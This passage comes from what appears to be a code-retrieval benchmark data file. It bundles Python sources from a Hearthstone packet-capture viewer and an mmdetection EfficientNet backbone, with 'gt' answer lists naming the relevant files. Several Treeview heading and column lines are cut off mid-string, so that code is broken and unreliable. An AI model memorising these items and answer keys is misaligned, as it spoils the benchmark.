GameTag.__dict__.get(tagval.upper(), None)\n\n        if numeric is None:\n            return\n\n        enum = utils._gametag_to_enum.get(numeric, None)\n        if enum is None:\n            return\n\n        self._fvalue['values'] = sorted([x.capitalize() for x in enum.reverse.values()])\n\nclass EntityTree:\n    def __init__(self, container):\n        self._build_widgets(container)\n        self._world = None\n        self._filter_fun = lambda x:True\n\n    def _build_widgets(self, container):\n        tree = ttk.Treeview(container, columns=('Info','Value'))\n        tree.heading('\n        tree.heading('\n        tree.heading('\n\n        vsb = ttk.Scrollbar(container, orient='vertical', command=tree.yview)\n        tree.configure(yscrollcommand=vsb.set)\n\n        tree.grid(column=0, row=0, sticky='nsew')\n        vsb.grid(column=1, row=0, sticky='ns')\n\n        container.grid_columnconfigure(0, weight=1)\n        container.grid_rowconfigure(0, weight=1)\n\n        self._tree = tree\n\n    def _add_entity(self, entity):\n        name = 'Entity {0}'.format(entity.id)\n        node = self._tree.insert('', 'end', str(entity.id), text=name,\n                                 value=(str(entity), ''))\n\n        pre = str(entity.id) + '.'\n        for tag, value in entity._tags.items():\n            self._tree.insert(node, 'end', pre + str(tag),\n                              text=str(tag),\n                              value=(GameTag.reverse.get(tag, ''),\n                                     utils.format_tag_value(tag, value)))\n\n    def _change_entity(self, eview):\n        pre = str(eview.id) + '.'\n        update_parent = False\n\n\n        in_tree = self._tree.exists(str(eview.id))\n        does_pass = self._filter_fun(eview)\n\n        if not does_pass:\n            if in_tree:\n                self._tree.delete(str(eview.id))\n            return\n        else:\n            if not in_tree:\n                self._add_entity(eview._e)\n\n        for tag, value in eview._tags.items():\n            if tag < 0 or tag == 49 or tag == 50:\n                update_parent = True\n            if eview._e[tag] is None:\n\n                self._tree.insert(str(eview.id), 'end', pre + str(tag),\n                                  text=tag,\n                                  value=(GameTag.reverse.get(tag, ''),\n                                         utils.format_tag_value(tag, value)))\n            else:\n\n                self._tree.item(pre + str(tag),\n                                value=(GameTag.reverse.get(tag, ''),\n                                       utils.format_tag_value(tag, value)))\n\n        if update_parent:\n            self._tree.item(str(eview.id),\n                            value=(str(eview), ''))\n\n    def set_filter(self, fun):\n        self._filter_fun = fun\n        if self._world is not None:\n            self.set_world(self._world)\n\n    def set_world(self, world):\n\n        dellist = list(self._tree.get_children())\n        for item in dellist:\n            self._tree.delete(item)\n\n\n        for entity in world:\n            if self._filter_fun(entity):\n                self._add_entity(entity)\n\n        self._world = world\n\n    def apply_transaction(self, transaction):\n        tree = self._tree\n\n        for entity in transaction._e.values():\n            if isinstance(entity, MutableView):\n\n                self._change_entity(entity)\n            else:\n\n                if self._filter_fun(entity):\n                    self._add_entity(entity)\n\nclass EntityBrowser:\n    def __init__(self):\n        self._build_widgets()\n        self._filters = []\n        self.cb = None\n        self._f = lambda x:True\n\n    def _on_destroy(self):\n        if self.cb is not None:\n            self.cb(self, 'destroy')\n        self._window.destroy()\n\n    def _build_widgets(self):\n        self._window = parent = tkinter.Toplevel()\n        parent.protocol('WM_DELETE_WINDOW', self._on_destroy)\n\n        browser_frame = ttk.Labelframe(parent, text='Entity Browser')\n        browser_frame.grid(row=0, column=0, sticky='nsew')\n\n        tree = EntityTree(browser_frame)\n\n        filter_frame = ttk.Labelframe(parent, text='Entity Filter')\n        filter_frame.grid(row=1, column=0, sticky='nsew')\n\n        parent.rowconfigure(0, weight=1)\n        parent.columnconfigure(0, weight=1)\n\n        button_frame = ttk.Frame(filter_frame)\n        button_frame.pack(fill='x')\n\n        b_apply = ttk.Button(button_frame, text='Apply Filter', command=self._apply_filter)\n        b_apply.pack(side='left', expand=True, fill='x')\n\n        b_add = ttk.Button(button_frame, text='Add Filter', command=self._add_filter)\n        b_add.pack(side='left', expand=True, fill='x')\n\n        self._tree = tree\n        self._filter_frame = filter_frame\n        self._button_frame = button_frame\n\n    def _apply_filter(self):\n        full = ' and '.join(filter(None, [ef.get_filter_string() for ef in self._filters]))\n        if full:\n            f = eval('lambda x: ' + full)\n        else:\n            f = lambda x:True\n        self._tree.set_filter(f)\n\n    def _remove_filter(self, ef, event):\n        self._filters.remove(ef)\n        ef.destroy()\n\n    def _add_filter(self):\n        efilter = EntityFilter(self._filter_frame)\n        efilter.pack(expand=True, fill='x')\n        efilter.cb = self._remove_filter\n\n        self._filters.append(efilter)\n        self._button_frame.pack_forget()\n        self._button_frame.pack(fill='x')\n\n    def set_world(self, world):\n        self._tree.set_world(world)\n\n    def apply_transaction(self, transaction):\n        self._tree.apply_transaction(transaction)\n\n'Hearthy/hearthy/ui/tkmain.py'\n:import tkinter\nfrom tkinter import ttk\n\nfrom hearthy.ui.tk.streamlist import StreamList\nfrom hearthy.ui.common import AsyncLogGenerator\nfrom hearthy.datasource import hcapng\n\nclass Application(ttk.Frame):\n    def __init__(self, master=None):\n        super().__init__(master)\n        self.pack(expand=True, fill='both')\n        self._build_widgets()\n        self._streams = StreamList(self._streams_frame)\n\n    def _build_widgets(self):\n        self._b_packets = ttk.Button(self, text='View Packets', command=self._on_log_view)\n        self._b_entities = ttk.Button(self, text='Entity Browser', command=self._on_entity_browser)\n        self._streams_frame = ttk.LabelFrame(self, text='Stream List')\n\n        self._streams_frame.grid(columnspan=2, row=0, column=0, sticky='nsew')\n        self._b_packets.grid(row=1, column=0, sticky='nsew')\n        self._b_entities.grid(row=1, column=1, sticky='nsew')\n\n        self.grid_columnconfigure(0, weight=1)\n        self.grid_columnconfigure(1, weight=1)\n        self.grid_rowconfigure(0, weight=1)\n\n    def _on_entity_browser(self):\n        self._streams.open_entity_browser()\n\n    def _on_log_view(self):\n        self._streams.open_stream_view()\n\n    def process_event(self, stream_id, event):\n        if event[0] == 'packet':\n            self._streams.on_packet(stream_id, *event[1:])\n        elif event[0] == 'create':\n            self._streams.on_create(stream_id, *event[1:])\n        elif event[0] == 'close':\n            self._streams.on_close(stream_id, *event[1:])\n        elif event[0] == 'basets':\n            self._streams.on_basets(event[1]*1000)\n\nif __name__ == '__main__':\n    import sys\n    import os\n    import logging\n\n    logging.basicConfig(level=logging.DEBUG)\n\n    if len(sys.argv) < 2:\n        print('Usage: {0} <hcap file>'.format(sys.argv[0]))\n        sys.exit(1)\n\n    root = tkinter.Tk()\n    root.geometry('800x300')\n    root.wm_title('MainWindow')\n\n    parser = hcapng.AsyncParser()\n    log_generator = AsyncLogGenerator()\n\n    app = Application(master=root)\n\n    fd = os.open(sys.argv[1], os.O_NONBLOCK | os.O_RDONLY)\n\n    def read_cb(fd, mask):\n        buf = os.read(fd, 1024)\n\n        if len(buf) == 0:\n\n            root.tk.deletefilehandler(fd)\n            return\n\n        try:\n            for ts, event in parser.feed_buf(buf):\n                for packet_event in log_generator.process_event(ts, event):\n                    app.process_event(*packet_event)\n        except:\n            root.tk.deletefilehandler(fd)\n            raise\n\n    root.tk.createfilehandler(fd, tkinter.READABLE, read_cb)\n    root.mainloop()\n\n    os.close(fd)\n\n'Hearthy/hearthy/ui/tk/streamlist.py'\n:import tkinter\nfrom tkinter import ttk\nfrom hearthy.tracker.processor import Processor\n\nfrom datetime import datetime\n\nfrom hearthy.ui.tk.entitybrowser import EntityBrowser\nfrom hearthy.ui.tk.streamview import StreamView\n\nclass Stream:\n    def __init__(self, stream_id, basets, start, source, dest):\n        self.id = stream_id\n        self.basets = basets\n        self.source = source\n        self.dest = dest\n        self.packet_count = 0\n        self.node = None\n        self.status = 'open'\n        self.start = start\n        self.end = None\n        self.packets = []\n\n    def get_values(self):\n        source = '{0}:{1}'.format(*self.source)\n        dest = '{0}:{1}'.format(*self.dest)\n        start = end = ''\n\n        if self.start is not None:\n            start = datetime.fromtimestamp((self.start+self.basets)//1000).strftime('%Y.%m.%d %H:%M:%S')\n        if self.end is not None:\n            end = datetime.fromtimestamp((self.end+self.basets)//1000).strftime('%Y.%m.%d %H:%M:%S')\n\n        return (self.packet_count, source, dest,\n                start, end, self.status)\n\nclass StreamList:\n    def __init__(self, container):\n        self._streams = {}\n        self._container = container\n        self._basets = 0\n        self._build_widgets()\n        self._stream_views = {}\n\n        self._entity_browsers = {}\n        self._trackers = {}\n\n    def _streamview_cb(self, sv, event):\n        if event == 'destroy':\n            for l in self._stream_views.values():\n                if sv in l:\n                    l.remove(sv)\n\n    def _entitybrowser_cb(self, eb, event):\n        if event == 'destroy':\n            to_delete = []\n            for world, l in self._entity_browsers.items():\n                if eb in l:\n                    l.remove(eb)\n\n    def _world_cb(self, world, event, *args):\n        if event == 'pre_apply':\n            for eb in self._entity_browsers.get(world, []):\n                eb.apply_transaction(*args)\n\n    def open_entity_browser(self):\n        sid = self.get_selected()\n        if sid is None:\n            return\n\n        tracker = self._trackers.get(sid, None)\n        if tracker is None:\n            stream = self._streams[sid]\n            tracker = self._trackers[sid] = Processor()\n\n            assert tracker._world.cb is None\n            tracker._world.cb = self._world_cb\n\n            for packet in stream.packets:\n                tracker.process(packet[1], packet[0])\n\n        world = tracker._world\n        l = self._entity_browsers.get(world, None)\n        if l is None:\n            l = self._entity_browsers[world] = []\n\n        eb = EntityBrowser()\n        eb.cb = self._entitybrowser_cb\n        l.append(eb)\n\n        eb.set_world(tracker._world)\n\n    def open_stream_view(self):\n        sid = self.get_selected()\n        if sid is None:\n            return\n\n        stream = self._streams[sid]\n        sv = StreamView(stream.id, stream.start)\n        sv.cb = self._streamview_cb\n\n        l = self._stream_views.get(sid, None)\n        if l is None:\n            l = self._stream_views[sid] = []\n        l.append(sv)\n\n        for packet in stream.packets:\n            sv.process_packet(*packet)\n\n    def get_selected(self):\n        s = self._view.selection()\n        if s:\n            sid = int(self._view.item(s[0], 'text').split(' ')[1])\n            return sid\n\n    def _build_widgets(self):\n        view = ttk.Treeview(self._container,\n                            columns=('n', 'Source', 'Dest', 'Start', 'End', 'Status'))\n        view.heading('\n        view.heading('\n        view.heading('\n        view.heading('\n        view.heading('\n        view.heading('\n        view.heading('\n\n        view.column('\n        view.column('\n        view.column('\n        view.column('\n        view.column('\n        view.column('\n        view.column('\n\n        view.pack(fill='both', expand=True)\n\n        self._view = view\n\n    def on_create(self, stream_id, source, dest, ts):\n        assert stream_id not in self._streams\n        stream = Stream(stream_id, self._basets, ts, source, dest)\n        self._streams[stream_id] = stream\n        self._update_view(stream)\n\n    def on_basets(self, ts):\n        self._basets = ts\n\n    def on_packet(self, stream_id, packet, who, ts):\n        stream = self._streams.get(stream_id, None)\n        assert stream is not None\n        stream.packet_count += 1\n        stream.packets.append((packet, who, ts))\n        self._update_view(stream)\n\n        for sv in self._stream_views.get(stream_id, []):\n            sv.process_packet(packet, who, ts)\n\n        tracker = self._trackers.get(stream_id, None)\n        if tracker is not None:\n            tracker.process(who, packet)\n\n    def on_close(self, stream_id, ts):\n        stream = self._streams.get(stream_id, None)\n        assert stream is not None\n        stream.status = 'closed'\n        stream.end = ts\n        self._update_view(stream)\n\n    def _update_view(self, stream):\n        if stream.node is None:\n            stream.node = self._view.insert('', 'end',\n                                            text='Stream {0}'.format(stream.id),\n                                            values=stream.get_values())\n        else:\n            self._view.item(stream.node, values=stream.get_values())\n\n'Hearthy/hearthy/tracker/entity.py'\n:from hearthy.protocol import enums\nfrom hearthy.protocol.enums import GameTag\nfrom hearthy.protocol.utils import format_tag_value\nfrom hearthy.exceptions import CardNotFound\nfrom hearthy.db import cards\n\n\nTAG_CUSTOM_NAME = -1\nTAG_POWER_NAME = -2\n\nclass EntityBase:\n    def __init__(self, eid, tag_list):\n        self._eid = eid\n        self._tags = dict(tag_list)\n\n    @property\n    def id(self):\n        return self._eid\n\n    def __getitem__(self, tag):\n        return self._tags.get(tag, None)\n\n    def __contains__(self, tag):\n        return tag in self._tags\n\n    def __str__(self):\n\n        custom = self[TAG_CUSTOM_NAME]\n        if custom:\n            return '[{0!r}]'.format(custom)\n\n        power = self[TAG_POWER_NAME]\n        if power:\n            try:\n                cardname = cards.get_by_id(power)\n            except CardNotFound:\n                cardname = power\n        else:\n            cardname = '?'\n\n        zone = self[GameTag.ZONE]\n        if zone:\n            where = enums.Zone.reverse[zone].capitalize()\n        else:\n            where = '?'\n\n        whom = 'Player{0}'.format(self[GameTag.CONTROLLER])\n\n        return '[{0}: {1!r} of {2} in {3}]'.format(self.id, cardname, whom, where)\n\nclass Entity(EntityBase):\n    pass\n\nclass MutableEntity(EntityBase):\n    def __setitem__(self, tag, value):\n        self._tags[tag] = value\n\n    def freeze(self):\n        self.__class__ = Entity\n        return self\n\nclass MutableView(EntityBase):\n    def __init__(self, entity):\n        self._e = entity\n        self._eid = entity.id\n        self._tags = dict()\n\n    @property\n    def id(self):\n        return self._eid\n\n    def __getitem__(self, tag):\n        value = self._tags.get(tag, None)\n        if value is None:\n            value = self._e[tag]\n        return value\n\n    def __setitem__(self, tag, value):\n        oldvalue = self[tag]\n        if oldvalue != value:\n            self._tags[tag] = value\n\n    def __contains__(self, tag):\n        return tag in self._tags or tag in self._e\n\n    def __str__(self):\n        ret = super().__str__()\n        for key, val in self._tags.items():\n            oldval = self._e[key]\n            ret += ('\\n\\ttag {1}:{2} {3} -> {4}'.format(\n                            self,\n                            key,\n                            GameTag.reverse.get(key, '?'),\n                            format_tag_value(key, oldval) if oldval else '(unset)',\n                            format_tag_value(key, val)))\n        return ret\n\n",
        "gt": [
            "'Hearthy/hearthy/tracker/entity.py'",
            "'Hearthy/hearthy/ui/tk/entitybrowser.py'",
            "'Hearthy/hearthy/ui/tk/streamlist.py'",
            "'Hearthy/hearthy/ui/tkmain.py'"
        ]
    },
    {
        "files": [
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/backbones/__init__.py'",
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/roi_heads/shared_heads/__init__.py'",
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/backbones/efficientnet.py'",
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/roi_heads/shared_heads/res_layer.py'"
        ],
        "content": "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/backbones/__init__.py'\n:\nfrom .csp_darknet import CSPDarknet\nfrom .darknet import Darknet\nfrom .detectors_resnet import DetectoRS_ResNet\nfrom .detectors_resnext import DetectoRS_ResNeXt\nfrom .efficientnet import EfficientNet\nfrom .hourglass import HourglassNet\nfrom .hrnet import HRNet\nfrom .mobilenet_v2 import MobileNetV2\nfrom .pvt import PyramidVisionTransformer, PyramidVisionTransformerV2\nfrom .regnet import RegNet\nfrom .res2net import Res2Net\nfrom .resnest import ResNeSt\nfrom .resnet import ResNet, ResNetV1d\nfrom .resnext import ResNeXt\nfrom .ssd_vgg import SSDVGG\nfrom .swin import SwinTransformer\nfrom .trident_resnet import TridentResNet\n\n__all__ = [\n    'RegNet', 'ResNet', 'ResNetV1d', 'ResNeXt', 'SSDVGG', 'HRNet',\n    'MobileNetV2', 'Res2Net', 'HourglassNet', 'DetectoRS_ResNet',\n    'DetectoRS_ResNeXt', 'Darknet', 'ResNeSt', 'TridentResNet', 'CSPDarknet',\n    'SwinTransformer', 'PyramidVisionTransformer',\n    'PyramidVisionTransformerV2', 'EfficientNet'\n]\n\n'SEE-VCN/see/detector2d/mmdetection/mmdet/models/roi_heads/shared_heads/__init__.py'\n:\nfrom .res_layer import ResLayer\n\n__all__ = ['ResLayer']\n\n'SEE-VCN/see/detector2d/mmdetection/mmdet/models/backbones/efficientnet.py'\n:\nimport copy\nimport math\nfrom functools import partial\n\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint as cp\nfrom mmcv.cnn.bricks import ConvModule, DropPath\nfrom mmcv.runner import BaseModule, Sequential\n\nfrom ..builder import BACKBONES\nfrom ..utils import InvertedResidual, SELayer, make_divisible\n\n\nclass EdgeResidual(BaseModule):\n\n\n    def __init__(self,\n                 in_channels,\n                 out_channels,\n                 mid_channels,\n                 kernel_size=3,\n                 stride=1,\n                 se_cfg=None,\n                 with_residual=True,\n                 conv_cfg=None,\n                 norm_cfg=dict(type='BN'),\n                 act_cfg=dict(type='ReLU'),\n                 drop_path_rate=0.,\n                 with_cp=False,\n                 init_cfg=None,\n                 **kwargs):\n        super(EdgeResidual, self).__init__(init_cfg=init_cfg)\n        assert stride in [1, 2]\n        self.with_cp = with_cp\n        self.drop_path = DropPath(\n            drop_path_rate) if drop_path_rate > 0 else nn.Identity()\n        self.with_se = se_cfg is not None\n        self.with_residual = (\n            stride == 1 and in_channels == out_channels and with_residual)\n\n        if self.with_se:\n            assert isinstance(se_cfg, dict)\n\n        self.conv1 = ConvModule(\n            in_channels=in_channels,\n            out_channels=mid_channels,\n            kernel_size=kernel_size,\n            stride=1,\n            padding=kernel_size // 2,\n            conv_cfg=conv_cfg,\n            norm_cfg=norm_cfg,\n            act_cfg=act_cfg)\n\n        if self.with_se:\n            self.se = SELayer(**se_cfg)\n\n        self.conv2 = ConvModule(\n            in_channels=mid_channels,\n            out_channels=out_channels,\n            kernel_size=1,\n            stride=stride,\n            padding=0,\n            conv_cfg=conv_cfg,\n            norm_cfg=norm_cfg,\n            act_cfg=None)\n\n    def forward(self, x):\n\n        def _inner_forward(x):\n            out = x\n            out = self.conv1(out)\n\n            if self.with_se:\n                out = self.se(out)\n\n            out = self.conv2(out)\n\n            if self.with_residual:\n                return x + self.drop_path(out)\n            else:\n                return out\n\n        if self.with_cp and x.requires_grad:\n            out = cp.checkpoint(_inner_forward, x)\n        else:\n            out = _inner_forward(x)\n\n        return out\n\n\ndef model_scaling(layer_setting, arch_setting):\n\n\n    new_layer_setting = copy.deepcopy(layer_setting)\n    for layer_cfg in new_layer_setting:\n        for block_cfg in layer_cfg:\n            block_cfg[1] = make_divisible(block_cfg[1] * arch_setting[0], 8)\n\n\n    split_layer_setting = [new_layer_setting[0]]\n    for layer_cfg in new_layer_setting[1:-1]:\n        tmp_index = [0]\n        for i in range(len(layer_cfg) - 1):\n            if layer_cfg[i + 1][1] != layer_cfg[i][1]:\n                tmp_index.append(i + 1)\n        tmp_index.append(len(layer_cfg))\n        for i in range(len(tmp_index) - 1):\n            split_layer_setting.append(layer_cfg[tmp_index[i]:tmp_index[i +\n                                                                        1]])\n    split_layer_setting.append(new_layer_setting[-1])\n\n    num_of_layers = [len(layer_cfg) for layer_cfg in split_layer_setting[1:-1]]\n    new_layers = [\n        int(math.ceil(arch_setting[1] * num)) for num in num_of_layers\n    ]\n\n    merge_layer_setting = [split_layer_setting[0]]\n    for i, layer_cfg in enumerate(split_layer_setting[1:-1]):\n        if new_layers[i] <= num_of_layers[i]:\n            tmp_layer_cfg = layer_cfg[:new_layers[i]]\n        else:\n            tmp_layer_cfg = copy.deepcopy(layer_cfg) + [layer_cfg[-1]] * (\n                new_layers[i] - num_of_layers[i])\n        if tmp_layer_cfg[0][3] == 1 and i != 0:\n            merge_layer_setting[-1] += tmp_layer_cfg.copy()\n        else:\n            merge_layer_setting.append(tmp_layer_cfg.copy())\n    merge_layer_setting.append(split_layer_setting[-1])\n\n    return merge_layer_setting\n\n\n@BACKBONES.register_module()\nclass EfficientNet(BaseModule):\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n    layer_settings = {\n        'b': [[[3, 32, 0, 2, 0, -1]],\n              [[3, 16, 4, 1, 1, 0]],\n              [[3, 24, 4, 2, 6, 0],\n               [3, 24, 4, 1, 6, 0]],\n              [[5, 40, 4, 2, 6, 0],\n               [5, 40, 4, 1, 6, 0]],\n              [[3, 80, 4, 2, 6, 0],\n               [3, 80, 4, 1, 6, 0],\n               [3, 80, 4, 1, 6, 0],\n               [5, 112, 4, 1, 6, 0],\n               [5, 112, 4, 1, 6, 0],\n               [5, 112, 4, 1, 6, 0]],\n              [[5, 192, 4, 2, 6, 0],\n               [5, 192, 4, 1, 6, 0],\n               [5, 192, 4, 1, 6, 0],\n               [5, 192, 4, 1, 6, 0],\n               [3, 320, 4, 1, 6, 0]],\n              [[1, 1280, 0, 1, 0, -1]]\n              ],\n        'e': [[[3, 32, 0, 2, 0, -1]],\n              [[3, 24, 0, 1, 3, 1]],\n              [[3, 32, 0, 2, 8, 1],\n               [3, 32, 0, 1, 8, 1]],\n              [[3, 48, 0, 2, 8, 1],\n               [3, 48, 0, 1, 8, 1],\n               [3, 48, 0, 1, 8, 1],\n               [3, 48, 0, 1, 8, 1]],\n              [[5, 96, 0, 2, 8, 0],\n               [5, 96, 0, 1, 8, 0],\n               [5, 96, 0, 1, 8, 0],\n               [5, 96, 0, 1, 8, 0],\n               [5, 96, 0, 1, 8, 0],\n               [5, 144, 0, 1, 8, 0],\n               [5, 144, 0, 1, 8, 0],\n               [5, 144, 0, 1, 8, 0],\n               [5, 144, 0, 1, 8, 0]],\n              [[5, 192, 0, 2, 8, 0],\n               [5, 192, 0, 1, 8, 0]],\n              [[1, 1280, 0, 1, 0, -1]]\n              ]\n    }\n\n\n\n\n    arch_settings = {\n        'b0': (1.0, 1.0, 224),\n        'b1': (1.0, 1.1, 240),\n        'b2': (1.1, 1.2, 260),\n        'b3': (1.2, 1.4, 300),\n        'b4': (1.4, 1.8, 380),\n        'b5': (1.6, 2.2, 456),\n        'b6': (1.8, 2.6, 528),\n        'b7': (2.0, 3.1, 600),\n        'b8': (2.2, 3.6, 672),\n        'es': (1.0, 1.0, 224),\n        'em': (1.0, 1.1, 240),\n        'el': (1.2, 1.4, 300)\n    }\n\n    def __init__(self,\n                 arch='b0',\n                 drop_path_rate=0.,\n                 out_indices=(6, ),\n                 frozen_stages=0,\n                 conv_cfg=dict(type='Conv2dAdaptivePadding'),\n                 norm_cfg=dict(type='BN', eps=1e-3),\n                 act_cfg=dict(type='Swish'),\n                 norm_eval=False,\n                 with_cp=False,\n                 init_cfg=[\n                     dict(type='Kaiming', layer='Conv2d'),\n                     dict(\n                         type='Constant',\n                         layer=['_BatchNorm', 'GroupNorm'],\n                         val=1)\n                 ]):\n        super(EfficientNet, self).__init__(init_cfg)\n        assert arch in self.arch_settings, \\\n            f'\"{arch}\" is not one of the arch_settings ' \\\n            f'({\", \".join(self.arch_settings.keys())})'\n        self.arch_setting = self.arch_settings[arch]\n        self.layer_setting = self.layer_settings[arch[:1]]\n        for index in out_indices:\n            if index not in range(0, len(self.layer_setting)):\n                raise ValueError('the item in out_indices must in '\n                                 f'range(0, {len(self.layer_setting)}). '\n                                 f'But received {index}')\n\n        if frozen_stages not in range(len(self.layer_setting) + 1):\n            raise ValueError('frozen_stages must be in range(0, '\n                             f'{len(self.layer_setting) + 1}). '\n                             f'But received {frozen_stages}')\n        self.drop_path_rate = drop_path_rate\n        self.out_indices = out_indices\n        self.frozen_stages = frozen_stages\n        self.conv_cfg = conv_cfg\n        self.norm_cfg = norm_cfg\n        self.act_cfg = act_cfg\n        self.norm_eval = norm_eval\n        self.with_cp = with_cp\n\n        self.layer_setting = model_scaling(self.layer_setting,\n                                           self.arch_setting)\n        block_cfg_0 = self.layer_setting[0][0]\n        block_cfg_last = self.layer_setting[-1][0]\n        self.in_channels = make_divisible(block_cfg_0[1], 8)\n        self.out_channels = block_cfg_last[1]\n        self.layers = nn.ModuleList()\n        self.layers.append(\n            ConvModule(\n                in_channels=3,\n                out_channels=self.in_channels,\n                kernel_size=block_cfg_0[0],\n                stride=block_cfg_0[3],\n                padding=block_cfg_0[0] // 2,\n                conv_cfg=self.conv_cfg,\n                norm_cfg=self.norm_cfg,\n                act_cfg=self.act_cfg))\n        self.make_layer()\n\n        if len(self.layers) < max(self.out_indices) + 1:\n            self.layers.append(\n                ConvModule(\n                    in_channels=self.in_channels,\n                    out_channels=self.out_channels,\n                    kernel_size=block_cfg_last[0],\n                    stride=block_cfg_last[3],\n                    padding=block_cfg_last[0] // 2,\n                    conv_cfg=self.conv_cfg,\n                    norm_cfg=self.norm_cfg,\n                    act_cfg=self.act_cfg))\n\n    def make_layer(self):\n\n        layer_setting = self.layer_setting[1:-1]\n\n        total_num_blocks = sum([len(x) for x in layer_setting])\n        block_idx = 0\n        dpr = [\n            x.item()\n            for x in torch.linspace(0, self.drop_path_rate, total_num_blocks)\n        ]\n\n        for i, layer_cfg in enumerate(layer_setting):\n\n            if i > max(self.out_indices) - 1:\n                break\n            layer = []\n            for i, block_cfg in enumerate(layer_cfg):\n                (kernel_size, out_channels, se_ratio, stride, expand_ratio,\n                 block_type) = block_cfg\n\n                mid_channels = int(self.in_channels * expand_ratio)\n                out_channels = make_divisible(out_channels, 8)\n                if se_ratio <= 0:\n                    se_cfg = None\n                else:\n\n\n                    se_cfg = dict(\n                        channels=mid_channels,\n                        ratio=expand_ratio * se_ratio,\n                        act_cfg=(self.act_cfg, dict(type='Sigmoid')))\n                if block_type == 1:\n                    if i > 0 and expand_ratio == 3:\n                        with_residual = False\n                        expand_ratio = 4\n                    else:\n                        with_residual = True\n                    mid_channels = int(self.in_channels * expand_ratio)\n                    if se_cfg is not None:\n\n\n                        se_cfg = dict(\n                            channels=mid_channels,\n                            ratio=se_ratio * expand_ratio,\n                            act_cfg=(self.act_cfg, dict(type='Sigmoid')))\n                    block = partial(EdgeResidual, with_residual=with_residual)\n                else:\n                    block = InvertedResidual\n                layer.append(\n                    block(\n                        in_channels=self.in_channels,\n                        out_channels=out_channels,\n                        mid_channels=mid_channels,\n                        kernel_size=kernel_size,\n                        stride=stride,\n                        se_cfg=se_cfg,\n                        conv_cfg=self.conv_cfg,\n                        norm_cfg=self.norm_cfg,\n                        act_cfg=self.act_cfg,\n                        drop_path_rate=dpr[block_idx],\n                        with_cp=self.with_cp,\n\n\n                        with_expand_conv=(mid_channels != self.in_channels)))\n                self.in_channels = out_channels\n                block_idx += 1\n            self.layers.append(Sequential(*layer))\n\n    def forward(self, x):\n        outs = []\n        for i, layer in enumerate(self.layers):\n            x = layer(x)\n            if i in self.out_indices:\n                outs.append(x)\n\n        return tuple(outs)\n\n    def _freeze_stages(self):\n        for i in range(self.frozen_stages):\n            m = self.layers[i]\n            m.eval()\n            for param in m.parameters():\n                param.requires_grad = False\n\n    def train(self, mode=True):\n        super(EfficientNet, self).train(mode)\n        self._freeze_stages()\n        if mode and self.norm_eval:\n            for m in self.modules():\n                if isinstance(m, nn.BatchNorm2d):\n                    m.eval()\n\n'SEE-VCN/see/detector2d/mmdetection/mmdet/models/roi_heads/shared_heads/res_layer.py'\n:\nimport warnings\n\nimport torch.nn as nn\nfrom mmcv.runner import BaseModule, auto_fp16\n\nfrom mmdet.models.backbones import ResNet\nfrom mmdet.models.builder import SHARED_HEADS\nfrom mmdet.models.utils import ResLayer as _ResLayer\n\n\n@SHARED_HEADS.register_module()\nclass ResLayer(BaseModule):\n\n    def __init__(self,\n                 depth,\n                 stage=3,\n                 stride=2,\n                 dilation=1,\n                 style='pytorch',\n                 norm_cfg=dict(type='BN', requires_grad=True),\n                 norm_eval=True,\n                 with_cp=False,\n                 dcn=None,\n                 pretrained=None,\n                 init_cfg=None):\n        super(ResLayer, self).__init__(init_cfg)\n\n        self.norm_eval = norm_eval\n        self.norm_cfg = norm_cfg\n        self.stage = stage\n        self.fp16_enabled = False\n        block, stage_blocks = ResNet.arch_settings[depth]\n        stage_block = stage_blocks[stage]\n        planes = 64 * 2**stage\n        inplanes = 64 * 2**(stage - 1) * block.expansion\n\n        res_layer = _ResLayer(\n            block,\n            inplanes,\n            planes,\n            stage_block,\n            stride=stride,\n            dilation=dilation,\n            style=style,\n            with_cp=with_cp,\n            norm_cfg=self.norm_cfg,\n            dcn=dcn)\n        self.add_module(f'layer{stage + 1}', res_layer)\n\n        assert not (init_cfg and pretrained), \\\n            'init_cfg and pretrained cannot be specified at the same time'\n        if isinstance(pretrained, str):\n            warnings.warn('DeprecationWarning: pretrained is a deprecated, '\n                          'please use \"init_cfg\" instead')\n            self.init_cfg = dict(type='Pretrained', checkpoint=pretrained)\n        elif pretrained is None:\n            if init_cfg is None:\n                self.init_cfg = [\n                    dict(type='Kaiming', layer='Conv2d'),\n                    dict(\n                        type='Constant',\n                        val=1,\n                        layer=['_BatchNorm', 'GroupNorm'])\n                ]\n        else:\n            raise TypeError('pretrained must be a str or None')\n\n    @auto_fp16()\n    def forward(self, x):\n        res_layer = getattr(self, f'layer{self.stage + 1}')\n        out = res_layer(x)\n        return out\n\n    def train(self, mode=True):\n        super(ResLayer, self).train(mode)\n        if self.norm_eval:\n            for m in self.modules():\n                if isinstance(m, nn.BatchNorm2d):\n                    m.eval()\n",
        "gt": [
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/backbones/efficientnet.py'",
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/backbones/__init__.py'",
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/roi_heads/shared_heads/res_layer.py'",
            "'SEE-VCN/see/detector2d/mmdetection/mmdet/models/roi_heads/shared_heads/__init__.py'"
        ]
    },
    {
        "files": [
            "'blog_xtg/controller/admin_article.py'",
            "'blog_xtg/main.py'",
            "'blog_xtg/url_mapping.py'",
            "'blog_xtg/service/article_service.py'"
        ],
        "content": "'blog_xtg/controller/admin_article.py'\n:\nfrom tornado.gen import coroutine\nfrom tornado.web import authenticated\n\nfrom base import BaseHandler\nfrom config import session_keys\nfrom model.models import Article\nfrom model.constants import Constants\nfrom service.article_service import ArticleService\nfrom service.article_type_service import ArticleTypeService\nfrom service.init_service import SiteCacheService\nfrom service.comment_service import CommentService\nfrom model.search_params.article_params import ArticleSearchParams\nfrom model.search_params.comment_params import CommentSearchParams\nfrom model.pager import Pager\n\n\nclass ArticleAndCommentsFlush(object):\n    @coroutine\n    def flush_article_cache(self, action, article):\n        yield SiteCacheService.update_article_action(self.cache_manager, action, article,\n                                                     is_pub_all=True, pubsub_manager=self.pubsub_manager)\n\n    @coroutine\n    def flush_comments_cache(self, action, comments):\n        yield SiteCacheService.update_comment_action(self.cache_manager, action, comments,\n                                                     is_pub_all=True, pubsub_manager=self.pubsub_manager)\n\n\nclass AdminArticleHandler(BaseHandler, 